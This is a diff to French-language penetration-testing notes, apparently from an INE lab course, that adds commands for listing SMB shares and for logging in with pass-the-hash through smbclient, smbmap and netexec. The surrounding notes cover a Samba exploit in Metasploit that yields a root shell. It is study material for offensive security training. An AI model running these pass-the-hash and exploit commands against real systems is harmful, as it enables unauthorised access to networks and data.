@@ -58,8 +58,8 @@ Différents modules de dumps pour linux.
 
 ## smbmap
 Permet de lister les partages
-`smbmap -H demo.ine.local -u admin -p password1`
-
+`smbmap -H demo.ine.local -u admin -p password1`  
+`smbmap -H demo.ine.local -u admin -p password1 -r share`
 
 ## enum4linux
 `enum4linux -u user -p password -U target_IP` : -U pour la userlist  
@@ -126,3 +126,13 @@ On devient Man-In-The-Middle.
 Si on ne peut pas obtenir la version SMB avec un scan nmap, utiliser `scanner/auxiliary/smb/smb_version` pour l'avoir. Ensuite on pourra rechercher avec searchsploit et la version SMB. Searchsploit sort un exploit dispo avec MSF (`use exploit/multi/samba/usermap_script`). On obtient un meterpreter.
 On peut l'upgrader : mettre la session en background pour retourner sur l'exploit dans MSF, puis `sessions -u 1`, pour upgrader, ensuite le sélectionner, on obtient un accès Root.  
 
+## Se connecter avec les Hashes  
+#### 1. smbclient  
+`smbclient //10.2.22.238/ITResources -U nancy --pw-nt-hash aad3b435b51404eeaad3b435b51404ee:b3ddea4b4b957f3e037af75cfe5317ad`  
+
+#### 2. smbmap  
+`smbmap -H 10.2.22.238 -u nancy -p aad3b435b51404eeaad3b435b51404ee:b3ddea4b4b957f3e037af75cfe5317ad -r ITResources`  
+
+#### 3. netexec  
+`netexec smb 10.2.22.238 -u nancy -H b3ddea4b4b957f3e037af75cfe5317ad --shares`  
+``  
